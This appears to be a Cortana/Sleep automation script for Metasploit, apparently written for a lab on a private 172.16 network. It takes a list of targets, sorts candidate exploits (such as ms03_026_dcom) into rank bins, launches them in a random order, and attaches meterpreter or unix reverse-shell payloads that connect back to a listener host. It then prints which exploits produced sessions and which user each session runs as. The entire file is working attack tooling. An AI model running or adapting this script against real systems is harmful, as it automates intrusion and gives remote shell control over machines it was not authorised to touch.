command arguments {
   local('$counter @attacks $minBin');

   $counter = $1;
   @attacks = split(';', "172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,4.0;"); #172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;");
   #@attacks = split(';', "$2");
   $minBin = $3;
   $numExisting = $4;

   fire_event_local("prep_attacks", $counter, @attacks, $minBin, $numExisting);
}

on prep_attacks {
   local('@attacks @temp @hosts %num_exps $counter $i $j $k $z $bin $limit $host $rank $tempHost $numBins %h %exploits');
   
   $limit = $1;
   @temp = $2;
   $tempHost = "";
   $j = 0;
   $k = 0;

   $numBins = (6 - $3);

   for ($i = 0; $i < $limit; $i++, $k++) {
      $host = split(',', @temp[$i])[0];

      $rank = split(',', @temp[$i])[3];
      #println($tempHost . " vs " . $host);
      if ($tempHost eq "") {
         $tempHost = $host;
         for ($z = 0; $z <= $numBins; $z++) {
            %h[$tempHost][$z] = @();
         }
         for ($z = 0; $z <= 1; $z++) {
            %exploits[$tempHost][$z] = @();
         }
         push(@hosts, $tempHost);
      }
      else if ($tempHost ne $host) {
         %num_exps[$temphost] = $counter;
         $tempHost = $host;
         $j++;
         $k = 0;
         for ($z = 0; $z <= $numBins; $z++) {
            %h[$tempHost][$z] = @();
         }
         for ($z = 0; $z <= 1; $z++) {
            %exploits[$tempHost][$z] = @();
         }
         push(@hosts, $tempHost);   
      }      
      
      $bin = determineBin($numBins, $rank);
      push(%h[$tempHost][$bin], @temp[$i]);
      %num_exps[$tempHost] += 1;  
   }

   #println(%h);
   #println(%num_exps);
   #println(@hosts);
   #println(%exploits);
   fire_event_local("launch_attacks", %h, $numBins, %num_exps, @hosts, %exploits, $4);
   #quit();
}

sub determineBin {
   local('$i $t')

   $t = 6.0;
   for ($i = 0; $i <= $1; $i++) {
      if ($2 >= ($t - $i)) {
         return $i;
      }
   }
}

sub getBin {
   local('$numBins $val');

   $val = rand(20);
   $numBins = $1;

   if ($numBins == 0) {
      return 0;
   }
   else if ($numBins == 1) {
      if ($val <= 14) {
         return 0;
      }
      else {
         return 1;
      }
   }
   else if ($numBins == 2) {
      if ($val <= 12) {
         return 0;
      }
      else if ($val <= 17) {
         return 1;
      }
      else {
         return 2;
      }
   }
   else if ($numBins == 3) {
      if ($val <= 11) {
         return 0;
      }
      else if ($val <= 15) {
         return 1;
      }
      else if ($val <= 18) {
         return 2;
      }
      else {
         return 3;
      }
   }
}

sub determinePayload {
   if ($1 == "windows") {
      return "windows/meterpreter/reverse_tcp";
   }
   return "cmd/unix/reverse";
}

# $1 = %h, $2 = $numBins, $3 = %num_exps, $4 = @hosts, $5 = %exploits, $6 = $numExisting
on launch_attacks {  
   local('$console %h $numBins %num_exps @hosts %exploits %attacks $payload $i $host $bin $count $attack %exp_run $rhost $name $lhost $os $exploit $numExisting $tempNumBins');

   %attacks = $1;
   $numBins = $2;
   %num_exps = $3;
   @hosts = $4;
   %exploits = $5;
   $numSessions = $6;

   $console = console();
   cmd($console, "jobs -K");
   $payload = "";
   $count = 0;

   #println("numBins: " . "$numBins");

   for ($i = 0; $i < size(@hosts); $i++) {
      $tempNumBins = $numBins;
      $host = @hosts[$i];
      #println("Num exploits for $host : " . %num_exps[$host]);
      while ($count < %num_exps[$host]) {
         $bin = -1;
         while ($bin < 0) {
            $bin = getBin($tempNumBins);
            if (size(%attacks[$host][$bin]) == 0) {
               #println(%attacks[$host]);
               (%attacks[$host])= moveBins(%attacks[$host], $bin, $tempNumBins);
               $tempNumBins--;
               #println(%attacks[$host]);
               $bin = -1;
            }
            #println("loop bin: " . "$bin");
         }
         #println("exit bin: " . "$bin");
         #println(size(%attacks[$host][$bin]));
         $count++;
         #println(%attacks[$host][$bin]);
         $attack = rand(%attacks[$host][$bin]);
         remove(%attacks[$host][$bin], $attack);

         ($rhost, $name, $lhost) = split(',', $attack);
         $os = split('/', $name)[0];
         $exploit = "exploit/" . $name;

         cmd($console, "use $exploit");

         if ($payload eq "") {
            $payload = determinePayload($os);
         }

         if ($os ne "multi") {
            cmd($console, "set payload " . $payload);
         }

         cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", TARGET => "0"));
         cmd($console, "exploit -j");
      
         sleep(4000);
         cmd($console, "jobs -K");
         sleep(1000);
         if (size(sessions()) > $numSessions) {
            $numSessions = size(sessions());
            push(%exploits[$host][1], $name);
            break;
         }
         else {
            push(%exploits[$host][0], $name);
         }
      }
      %exp_run[$host] = $count;
      $count = 0;
      $payload = "";
   }
   #println(%exp_run);
   #println(%exploits);
   cmd_stop($console);
   fire_event_local("sessionHandle", @hosts, %exploits, %exp_run);
}

#$1 = %attacks[$host], $2 = $bin, $3 = $numBins
sub moveBins {
   local('%attacks $bin, $numBins $i');

   %attacks = $1;
   $bin = $2;
   $numBins = $3;

   for ($i = $bin; $i < $numBins; $i++) {
      %attacks[$i] = copy(%attacks[$i + 1]);
      clear(%attacks[$i + 1]);
   }

   return %attacks;
}

#$1 = @hosts, $2 = %exploits, $3 = %exp_run
on sessionHandle {
   local('$console @hosts %exploits %exp_run %out @ids $flag $sessionNum $host $user %r $exploit $type $port $i $j $numRun');

   @hosts = $1;
   %exploits = $2;
   %exp_run = $3;
   
   @ids = session_ids();
   %out = sessions();
   $flag = "true";
   $console = console();
   @hosts = $1;

   cmd($console, "jobs -K");

   foreach $sessionNum (@ids) {
   	%r = %out[$sessionNum];
   	$host = %r["host"];
   	$user = %r["username"];
   	$exploit = split('/', %r["via_exploit"], 2)[1];
      $type = %r["type"];
      $port = %r["session_port"];

      if ($host in @hosts) {
         $numRun = %exp_run[$host];
   	   println("$host" . "," . "$flag" . "," . "$sessionNum" . "," . "$user" . "," . "$exploit" . "," . "$type" . "," . "$port" . "," . "$numRun");
         for ($i = 0; $i < 2; $i++) {
            for ($j = 0; $j < size(%exploits[$host][$i]); $j++) {
               println(%exploits[$host][$i][$j] . "," . $i);
            }
         }
         remove(@hosts, $host);
      }
   }
   cmd_stop($console);
   fire_event_local("noSessions", @hosts, %exploits, %exp_run);
}

on noSessions {
   local('$host @hosts %exploits %exp_run $i $j $numRun');

   @hosts = $1;
   %exploits = $2;
   %exp_run = $3;

   foreach $host (@hosts) {
      $numRun = %exp_run[$host];
      println("$host" . ",false,0,0,0,0,0," . "$numRun");
      for ($i = 0; $i < 2; $i++) {
         for ($j = 0; $j < size(%exploits[$host][$i]); $j++) {
            println(%exploits[$host][$i][$j] . "," . $i);
         }
      }
   }
   quit();
}